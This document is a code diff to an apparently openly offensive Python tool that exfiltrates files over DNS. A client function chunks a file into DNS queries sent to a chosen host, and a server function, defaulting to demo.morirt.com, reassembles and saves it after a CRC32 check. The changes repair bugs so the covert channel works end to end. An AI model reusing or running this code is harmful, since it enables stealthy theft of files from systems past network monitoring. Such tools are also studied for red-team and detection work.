@@ -73,7 +73,6 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 		return -1
 
 	checksum = zlib.crc32(exfil_me)  # Calculate CRC32 for later verification
-
 	# Try and check if you can send data
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -84,11 +83,9 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 	# Initiation packet:
 	dns_request = build_dns(host)                                               # Build the DNS Query
 	head, tail = os.path.split(path_to_file)                                       # Get filename
-	dns_request += INITIATION_STRING + tail + DELIMITER + checksum + NULL              # Extra data goes here
-
+	dns_request += INITIATION_STRING + tail + DELIMITER + str(checksum) + NULL              # Extra data goes here
 	addr = (host, port)             # build address to send to
 	s.sendto(dns_request, addr)
-
 	# Sending actual file:
 	chunks = [exfil_me[i:i + max_packet_size] for i in range(0, len(exfil_me), max_packet_size)]  # Split into chunks
 	for chunk in chunks:
@@ -140,29 +137,27 @@ def dns_server(host="demo.morirt.com", port=53, play_dead=True):
 		if data.find(INITIATION_STRING) != -1:
 			# Found initiation packet:
 			offset_delimiter = data.find(DELIMITER) + len(DELIMITER)
-			offset_null = data.find(NULL)
-
 			filename = data[data.find(INITIATION_STRING) + len(INITIATION_STRING):data.find(DELIMITER)]
-			crc32 = data[offset_delimiter:offset_null]
-
+			crc32 = data[offset_delimiter: -1] 
 			sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename))
 			actual_file = ""
 			chunks_count = 0
 
-		elif data.find(DELIMITER) != -1 and data.find(INITIATION_STRING) == -1:
+		elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR) == -1 and data.find(INITIATION_STRING) == -1:
 			# Found data packet:
+			len_head = len("\x00\x00\x01\x00\x01")
+			end_of_payload = data.find(DATA_TERMINATOR) #the upper limit of the data to exfiltrate
 			end_of_header = data.find("\x00\x00\x01\x00\x01")
-			actual_file += data[end_of_header:]
+			actual_file += data[end_of_header + len_head: end_of_payload] #adding the length to get the first index of the payload
 			chunks_count += 1
 
 		elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR):
 			# Found termination packet:
-
-			# Will now compate CRC32s:
+			# Will now compare CRC32s:
 			if crc32 == str(zlib.crc32(actual_file)):
 				sys.stdout.write("CRC32 match! Now saving file")
-				fh = open(str(crc32) + filename, WRITE_BINARY)
-				fh.write(filename)
+				fh = open(filename + str(crc32), WRITE_BINARY)
+				fh.write(actual_file) 
 				fh.close()
 				replay = "Got it. Thanks :)"
 				s.sendto(replay, addr)
@@ -176,7 +171,7 @@ def dns_server(host="demo.morirt.com", port=53, play_dead=True):
 			crc32 = ""
 			i = 0
 			addr = ""
-
+		
 		else:
 			sys.stdout.write("Regular packet. Not listing it.")
 
